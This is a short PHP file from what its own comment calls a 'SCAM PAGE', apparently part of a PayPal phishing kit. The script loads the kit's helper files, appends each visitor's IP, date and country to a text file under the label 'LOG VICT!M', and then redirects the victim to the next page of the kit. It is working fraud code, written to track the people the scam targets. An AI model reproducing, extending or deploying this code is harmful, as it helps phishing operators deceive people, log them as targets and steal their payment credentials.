<?php
//<!-- SCAM PAGE PPL V5 #By Zetas Oujdi, WORK HARD DREAM B!G -->
include ('./oamo/bt.php');
include ('./oamo/makelang.php');
$milaf = fopen("V.txt","a");
fwrite($milaf,$ib."  -| LOG VICT!M !! |-   ".$dt."                  -        " . $cntc ."\n");
header('Location: dir.php');
?>

